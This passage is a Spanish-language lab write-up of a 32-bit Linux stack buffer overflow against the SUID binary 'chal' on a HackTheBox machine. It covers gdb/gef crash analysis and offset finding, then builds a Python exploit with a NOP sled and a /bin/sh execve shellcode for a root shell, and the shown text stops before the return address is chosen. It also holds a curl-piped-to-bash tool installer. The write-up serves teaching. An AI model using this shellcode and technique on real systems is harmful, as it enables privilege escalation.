---
title: Basic BoF Linux 32bits
date: 2024-03-19
categories: [Linux, Cajón que no cierra]
tags: [Buffer Overflow]
---

Hola,hola!. En la anterior sección de esta carpeta explicamos un Buffer Overflow a una máquina Windows de 32 bits sin protecciones, hoy haremos lo mismo pero para un Linux. Ya veréis que es muy similar. Así que estamos ante un **Buffer Overflow a un Linux 32 bits sin protecciones**.


## Contexto y preparación

Ya expliqué más en detalle como funciona un Buffer Overlow en el post "Basic BoF Linux 32bits", así que en este post intentaré ir más al grano.  
Como ejemplo de este BoF usamos un programa de la máquina de HTB **Sneaky**, este programa tenía el nombre de **chal** y era vulnerable a buffer overflow.

**Poniendo en contexto**.  
Una vez en la máquina objetivo vimos que era una máquina de 32 bits (lo que es sospechoso de BoF) además había un programa llamado **chal** que llamaba la atención:

```sh
thrasivoulos@Sneaky:~$ chal AAA
thrasivoulos@Sneaky:~$ python -c 'print "A"*1000'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
thrasivoulos@Sneaky:~$ chal $(python -c 'print "A"*1000')
Segmentation fault (core dumped)
thrasivoulos@Sneaky:~$ 
```

Básicamente falla porque hemos escrito más de los caracteres permitidos por el programa. Cuando lo hacemos los registros se llenan, nuestro propósito es llegar al registro EIP.  
EIP = Extended Instruction Pointer. Puntero de instrucción que apunta a la siguiente instrucción que el microprocesador debe ejecutar.  
Al sobreescribir el registro EIP puedes controlar que apunte a la instrución que quieras ejecutar.

Primero paso el programa a mi equipo, así puedo manejarlo mejor. En la máquina Sneaky:

```sh
thrasivoulos@Sneaky:~$ which chal | xargs base64 -w 0; echo
f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAIIMECDQAAABUEQAAAAAAADQAIAAJACgAHgAbAAYAAAA0AAAANIAECDSABAggAQAAIAEAAAUAAAAEAAAAAwAAAFQBAABUgQQIVIEECBMAAAATAAAABAAAAAEAAAABAAAAAAAAAACABAgAgAQIvAUAALwFAAAFAAAAABAAAAEAAAAIDwAACJ8ECAifBAgYAQAAHAEAAAYAAAAAEAAAAgAAABQPAAAUnwQIFJ8ECOgAAADoAAAABgAAAAQAAAAEAAAAaAEAAGiBBAhogQQIRAAAAEQAAAAEAAAABAAAAFDldGTgBAAA4IQECOCEBAgsAAAALAAAAAQAAAAEAAAAUeV0ZAAAAAAAAAAAAAAAAAAAAAAAAAAABwAAABAAAABS5XRkCA8AAAifBAgInwQI+AAAAPgAAAAEAAAAAQAAAC9saWIvbGQtbGludXguc28uMgAABAAAABAAAAABAAAAR05VAAAAAAACAAAABgAAABgAAAAEAAAAFAAAAAMAAABHTlUA/IrQb8+v4fvC26oaZSItaFsEexECAAAABAAAAAEAAAAFAAAAACAAIAAAAAAE... SNIP .....
# Lo copio
#Por comprobar la integridad de la data:
thrasivoulos@Sneaky:~$ md5sum /usr/local/bin/chal
829873da7efc928ad1fc9cc3b793a639  /usr/local/bin/chal
```

Y ahora en mi máquina (me paso a una bash mejor):

```sh
> bash
> sudo su
> echo "CADENA" > base64 -d > chal
# Compruebo con md5sum que se ha copiado bien, y si:
❯ md5sum chal
829873da7efc928ad1fc9cc3b793a639  chal
❯ file chal
chal: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fc8ad06fcfafe1fbc2dbaa1a65222d685b047b11, not stripped
❯ chmod +x chal

❯ ./chal
zsh: segmentation fault  ./chal
```

Y parece que todo bien, se ha pasado bien, lo tenemos en local.  
Para analizar el programa usaré la herramienta **gdb** y dentro de ella la utilidad **gef**. Para instalarla [aquí](https://github.com/hugsy/gef).

```sh
❯ bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```

## Explotación del BoF

```sh
❯ gdb ./chal
GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git
Copyright (C) 2021 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 10.1.90.20210103-git in 0.00ms using Python engine 3.9
Reading symbols from ./chal...
(No debugging symbols found in ./chal)
gef➤  
```

Y nos sale por defecto el **gef**, si no queremos que nos salga todo ese prompt mejor lanzar el gdb con la opción **-q** de quite.

```sh
❯ gdb ./chal -q
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 10.1.90.20210103-git in 0.00ms using Python engine 3.9
Reading symbols from ./chal...
(No debugging symbols found in ./chal)
gef➤ 
```

Para mirar las protecciones del programa se usa **checksec**, en este caso no tiene ninguna:

```sh
gef➤  checksec
[+] checksec for '/home/guise/HTB/Machines/Linux/Sneaky/reco/chal'
Canary                        : ✘ 
NX                            : ✘ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

Para ejecutar el programa en gdb:

```sh
gef➤  r AA
Starting program: /home/guise/HTB/Machines/Linux/Sneaky/reco/chal AA
[Inferior 1 (process 87423) exited normally]
# r de run, para que ejecute el programa con el argumento AA.
gef➤  r AAAA
Starting program: /home/guise/HTB/Machines/Linux/Sneaky/reco/chal AAAA
[Inferior 1 (process 87616) exited normally]
# De momento funciona correctamente, como debería.
```

Pero si le lanzamos muchos caracteres pasa esto:

```sh
gef➤ r $(python -c 'print "A"*1000')
```

![gdb]({{ 'assets/img/Linux/CajonNoCierra/basicBofLinux32/gdb1.png' | relative_url }}){: .center-image }

Podemos ver por ejemplo que el registro EBP vale 0x41414141 que en hexadecimal es "AAAA". El registro **EIP** también se ha sobreescrito con esos valores -ya que todo que pusimos son "A"-. Como EIP debe tener la dirección de la próxima instrucción a ejecutar y esta dirección es "AAAA" esta dirección no existe y por eso falla y responde con "Segmentation Fault".

Para efectuar el Buffer Overflow tenemos que preguntarnos cuantas "A" o caracteres tenemos que poner hasta llegar a EIP. Justo después de ese número de caracteres hasta EIP podemos meter la dirección deseada en el EIP para que el flujo del programa vaya por donde yo quiero.

Con gef podemos crear un patrón de caracteres para luego identificar mejor en que número llegamos a EIP:

```sh
gef➤  pattern create 1000
[+] Generating a pattern of 1000 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj
[+] Saved as '$_gef0'
gef➤  
```
Si ahora lanzo como argumento ese patrón podemos saber el número de carácteres hasta llegar a EIP:

```sh
# Es; run CADENA 
gef➤ run
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0       
$ebx   : 0xf7e1cff4  →  0x0021cd8c
$ecx   : 0xffffd5d0  →  "xaajyaaj"
$edx   : 0xffffd212  →  "xaajyaaj"
$esp   : 0xffffcfa0  →  "adraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaae[...]"
$ebp   : 0x61706461 ("adpa"?)
$esi   : 0x08048450  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x61716461 ("adqa"?)
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcfa0│+0x0000: "adraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaae[...]"	← $esp
0xffffcfa4│+0x0004: "adsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaae[...]"
0xffffcfa8│+0x0008: "adtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaae[...]"
0xffffcfac│+0x000c: "aduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaae[...]"
0xffffcfb0│+0x0010: "advaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaae[...]"
0xffffcfb4│+0x0014: "adwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaae[...]"
0xffffcfb8│+0x0018: "adxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaae[...]"
0xffffcfbc│+0x001c: "adyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaae[...]"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x61716461
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chal", stopped 0x61716461 in ?? (), reason: SIGSEGV
```

Ahora EIP vale **adqa**. Y podemos recuperar su posición con **pattern offset**:

```sh
gef➤  pattern offset $eip
[+] Searching for '61647161'/'61716461' with period=4
[+] Found at offset 362 (little-endian search) likely
gef➤ 
```
Es decir, son 362 caracteres hasta llegar a EIP, los siguientes 4 caracteres son los que sobreescriben el EIP. Veámoslo con este ejemplo:

```sh
gef➤ r $(python -c 'print "A"*362' + print "B"*4)

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0       
$ebx   : 0xf7e1cff4  →  0x0021cd8c
$ecx   : 0xffffd5d0  →  "AAAABBBB"
$edx   : 0xffffd208  →  "AAAABBBB"
$esp   : 0xffffd210  →  0x00000000
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0x08048450  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x42424242 ("BBBB"?)
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd210│+0x0000: 0x00000000	← $esp
0xffffd214│+0x0004: 0xffffd2c4  →  0xffffd43a  →  "/home/guise/HTB/Machines/Linux/Sneaky/reco/chal"
0xffffd218│+0x0008: 0xffffd2d0  →  0xffffd5d9  →  "LC_TIME=es_ES.UTF-8"
0xffffd21c│+0x000c: 0xffffd230  →  0xf7e1cff4  →  0x0021cd8c
0xffffd220│+0x0010: 0xf7e1cff4  →  0x0021cd8c
0xffffd224│+0x0014: 0x0804841d  →  <main+0> push ebp
0xffffd228│+0x0018: 0x00000002
0xffffd22c│+0x001c: 0xffffd2c4  →  0xffffd43a  →  "/home/guise/HTB/Machines/Linux/Sneaky/reco/chal"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x42424242
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chal", stopped 0x42424242 in ?? (), reason: SIGSEGV
```

EIP ahora vale 0x42424242 o lo que es lo mismo "BBBB". Así que ya tenemos el control de EIP, podemos elegir la dirección que nos convenga.

Si ojeamos el archivo **/proc/sys/kernel/randomize_va_space** nos sale 0, eso es que no hay aleatorización en las direcciones de la memoria, es decir que son estáticas, no hay ASLR.

```sh
thrasivoulos@Sneaky:~$ cat /proc/sys/kernel/randomize_va_space
0
thrasivoulos@Sneaky:~$ which chal
/usr/local/bin/chal

# Para ver las librerias que usa la herramienta
thrasivoulos@Sneaky:~$ ldd /usr/local/bin/chal
	linux-gate.so.1 =>  (0xb7ffe000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e44000)
	/lib/ld-linux.so.2 (0x80000000)
# Esas direcciones serán estáticas. Si hacemos ldd más veces seguiran siendo las mismas.
thrasivoulos@Sneaky:~$ ldd /usr/local/bin/chal | grep libc | awk 'NF{print $NF}' | tr -d '()'
0xb7e44000
thrasivoulos@Sneaky:~$ for i in $(seq 1 5); do ldd /usr/local/bin/chal | grep libc | awk 'NF{print $NF}' | tr -d '()'; done
0xb7e44000
0xb7e44000
0xb7e44000
0xb7e44000
0xb7e44000
```

Bien, ¿qué dirección pongo en el EIP?.

Lo que haré ahora es escribir un **shellcode** -instrucción de bajo nivel-, que será básicamente ejecutar un **/bin/sh**. Este shellcode lo escribiré en algún punto donde estaban antes las "A". El shellcode entonces estará dentro de una dirección del programa la cual incluiremos en el EIP. La **EIP** llamará a la dirección donde esté el shellcode que metamos. Una vez que vaya a esa dirección se ejecutará el shellcode (meteremos **NOPs** antes de la /bin/sh para que moleste lo menos posible), una /bin/sh y como el binario es **SUID**, de **root**, tendremos la /bin/sh ejecutada por root.

## Preparando un script en python3 para el BoF

Siempre está guay hacer un scritp en python para el ataque!. Antes de empezar vamos a añadir más para verlo mejor, añadiremos unas "C":

```sh
gef➤  r $(python -c 'print "A"*362 + "B"*4 + "C"*500')

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0       
$ebx   : 0xf7e1cff4  →  0x0021cd8c
$ecx   : 0xffffd5d0  →  "CCCCCCCC"
$edx   : 0xffffd20c  →  "CCCCCCCC"
$esp   : 0xffffd020  →  "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0x08048450  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x42424242 ("BBBB"?)
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd020│+0x0000: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"	← $esp
0xffffd024│+0x0004: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd028│+0x0008: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd02c│+0x000c: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd030│+0x0010: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd034│+0x0014: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd038│+0x0018: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd03c│+0x001c: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x42424242
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chal", stopped 0x42424242 in ?? (), reason: SIGSEGV

```

Todo se acontece en la pila (desde el principio) en el **ESP**. La instrucción **x/100wx $esp** imprimirá los valores almacenados en la memoria (**x**), interpretados como enteros de 32 bits (**w**) en formato hexadecimal (**x**), comenzando desde la dirección almacenada en el registro de la pila (**$esp**), y se imprimiran 100 de estos valores. Esto sería útil si deseas examinar la pila en busca de valores específicos o patrones representados en formato hexadecimal.

```sh
gef➤  x/100wx $esp
0xffffd020:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd030:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd040:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd050:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd060:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd070:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd080:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd090:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd0a0:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd0b0:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd0c0:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd0d0:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd0e0:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd0f0:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd100:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd110:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd120:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd130:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd140:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd150:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd160:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd170:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd180:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd190:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd1a0:	0x43434343	0x43434343	0x43434343	0x43434343
```

En resumen, en la pila hay lo de arriba, y más, porque se puede ir hacia delante:

```sh
gef➤  x/100wx $esp+100
0xffffd084:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd094:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd0a4:	0x43434343	0x43434343	0x43434343	0x43434343
# Todo 0x43434343
... SNIP ...
```

En lugar de las "A" voy a meter **NOPs** antes del shell code (/bin/sh) -NOPs, No Operation-. Para que simplemente no haga nada, pero que ocupe espacio y se realize un desplazamiento limpio hacia el shellcode a ejecutar. Así no molesta tanto digamos.  
Veamos una parte del script en python, un boceto que luego modificaremos:

```py
#!/usr/bin/python3

# Esto es por el Little Endian; las direcciones de 32 bits que tienen que estar al revés
from struct import pack
import sys

# Siendo el offset el número de caracteres hasta sobreescribir EIP:
offset = 362
# En vez de las "A", que estan bien para ver más claro, colocaremos NOPs:
nops = b"\x90"*offset

# Con el siguiente payload el EIP valdrá \x42\x42\x42\x42
payload = nops + "\x42\x42\x42\x42"
```

**Busquemos un payload**, ese /bin/sh. En google busco por "shellcode 32 bits exec /bin/sh pascal" y entro a esta [página](https://shell-storm.org/shellcode/files/shellcode-811.html). Y esto son instrucciones a bajo nivel que permiten cargar una **/bin/sh**:

```plaintext
"\x31\xc0\x50\x68\x2f\x2f\x73"
"\x68\x68\x2f\x62\x69\x6e\x89"
"\xe3\x89\xc1\x89\xc2\xb0\x0b"
"\xcd\x80\x31\xc0\x40\xcd\x80";
```
Hay que ponerlas juntas como veremos. Añadimos el shellcode:

```py
#!/usr/bin/python3

# Esto es por el Little Endian; las direcciones de 32 bits que tienen que estar al revés
from struct import pack
import sys

# Siendo el offset el número de caracteres hasta sobreescribir EIP:
offset = 362
# En vez de las "A", que estan bien para ver más claro, colocaremos NOPs:
nops = b"\x90"*offset
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
# Con el siguiente payload el EIP valdrá \x42\x42\x42\x42
payload = nops + "\x42\x42\x42\x42"
```
Ahora bien, tengo que introducir el shellcode antes de llegar a EIP. Lo lógico es averiguar la longitud del shellcode, restarlo de los NOPs e introducirlo antes de llegar a EIP. Así que el nuevo offset sería; offset = 362 - (lengh)

```sh
❯ python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> cadena = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
>>> print(len(cadena))
28

# También así, opción -n para que no imprima nueva linea:
❯ echo -n "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" | wc -c
28
```

El nuevo offset -la cantidad de NOPs- serían:

```sh
❯ echo "362-28" | bc
334
```

Y el script de momento queda así:

```py
#!/usr/bin/python3

# Esto es por el Little Endian; las direcciones de 32 bits que tienen que estar al revés
from struct import pack
import sys

# Siendo el offset el número de caracteres hasta sobreescribir EIP:
offset = 334  # 362 - 28
# En vez de las "A", que estan bien para ver más claro, colocaremos NOPs:
nops = b"\x90"*offset
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

eip = pack("<I", ) # Incompleto, ahora vamos a ello
# Con el siguiente payload el EIP valdrá \x42\x42\x42\x42
payload = nops + shellcode + eip
```
Faltaría buscar una dirección de EIP, queremos apuntar a cualquier dirección donde haya NOPs, si caemos ahí habrá un desplazamiento (ya que no harán nada, no operation) hasta el shellcode.  
**Abrimos gdb, pero ahora desde la máquina objetivo**. Ya que las direcciones no serán las mismas en un equipo u otro.

```sh
thrasivoulos@Sneaky:~$ gdb chal -q
Reading symbols from chal...(no debugging symbols found)...done.
(gdb) r $(python -c 'print "\x90"*334 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x42\x42\x42\x42"')
Starting program: /usr/local/bin/chal $(python -c 'print "\x90"*334 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x42\x42\x42\x42"')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) i r
eax            0x0	0
ecx            0xbffffce0	-1073742624
edx            0xbffff974	-1073743500
ebx            0xb7fce000	-1208164352
esp            0xbffff980	0xbffff980
ebp            0x80cd40c0	0x80cd40c0
esi            0x0	0
edi            0x0	0
eip            0x42424242	0x42424242
eflags         0x10202	[ IF RF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) 
```

Nos sale distinto porque estamos en máquina objetivo y no estamos con gef de gdb. Pero vamos bien, como vemos el eip vale 0x42424242 ("BBBB"). **i r** es de **information registers**.  
Ahora echemos vistazo a la pila (esp) para ver como se está registrando todo:

```sh
(gdb) x/100wx $esp
0xbffff980:	0x00000000	0xbffffa14	0xbffffa20	0xb7feccca
0xbffff990:	0x00000002	0xbffffa14	0xbffff9b4	0x0804a014
0xbffff9a0:	0x0804821c	0xb7fce000	0x00000000	0x00000000
0xbffff9b0:	0x00000000	0x25047dfb	0x1d8219eb	0x00000000
0xbffff9c0:	0x00000000	0x00000000	0x00000002	0x08048320
0xbffff9d0:	0x00000000	0xb7ff24c0	0xb7e3ba09	0xb7fff000
0xbffff9e0:	0x00000002	0x08048320	0x00000000	0x08048341
0xbffff9f0:	0x0804841d	0x00000002	0xbffffa14	0x08048450
0xbffffa00:	0x080484c0	0xb7fed160	0xbffffa0c	0x0000001c
0xbffffa10:	0x00000002	0xbffffb6a	0xbffffb7e	0x00000000
0xbffffa20:	0xbffffced	0xbffffd02	0xbffffd19	0xbffffd2a
0xbffffa30:	0xbffffd42	0xbffffd52	0xbffffd5d	0xbffffd83
0xbffffa40:	0xbffffd9a	0xbffffdad	0xbffffdbf	0xbffffdd8
0xbffffa50:	0xbffffde3	0xbffffdef	0xbffffe4d	0xbffffe69
0xbffffa60:	0xbffffe78	0xbffffe96	0xbffffead	0xbffffebe
0xbffffa70:	0xbffffed9	0xbffffee2	0xbffffefa	0xbfffff02
0xbffffa80:	0xbfffff17	0xbfffff5f	0xbfffff7f	0xbfffff9e
0xbffffa90:	0xbfffffb2	0xbfffffd4	0x00000000	0x00000020
0xbffffaa0:	0xb7fdccf0	0x00000021	0xb7fdc000	0x00000010
0xbffffab0:	0x078bfbff	0x00000006	0x00001000	0x00000011
0xbffffac0:	0x00000064	0x00000003	0x08048034	0x00000004
